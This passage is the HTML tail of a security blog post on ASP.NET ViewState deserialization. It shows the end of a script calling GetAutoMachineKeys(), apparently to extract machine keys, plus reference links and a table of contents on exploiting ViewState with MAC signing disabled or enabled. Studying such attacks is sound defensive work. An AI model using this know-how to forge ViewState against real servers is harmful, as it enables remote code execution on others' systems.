+</span></span><span class="line"><span class="cl">    <span class="n">GetAutoMachineKeys</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="n">script</span><span class="p">&gt;</span></span></span></code></pre></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><blockquote>
+<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md</a></p>
+<p><a href="https://exp10it.io/posts/asp-net-viewstate-deserialization/" target="_blank" rel="external nofollow noopener noreferrer">https://exp10it.io/posts/asp-net-viewstate-deserialization/</a></p>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-08-24 21:07:02">Updated on 2026-08-24&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="ASP.NET ViewState反序列化" data-hashtags=".NET ViewState"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-hashtag=".NET ViewState"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="ASP.NET ViewState反序列化"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/.net-viewstate/" class="post-tag" title="Tags - .NET ViewState">.NET ViewState</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/post/fastjson-1.2.83-rce/" class="post-nav-item" rel="prev" title="Fastjson 1.2.83 RCE"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>Fastjson 1.2.83 RCE</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#基础知识">基础知识</a></li>
+    <li><a href="#viewstate">ViewState</a></li>
+    <li><a href="#viewstate反序列化利用">ViewState反序列化利用</a>
+      <ul>
+        <li><a href="#禁用mac签名">禁用MAC签名</a></li>
+        <li><a href="#启用mac签名">启用MAC签名</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.161.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.5"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">p0l1st</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/1a3220beaf860aef44158b2a9997904a.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
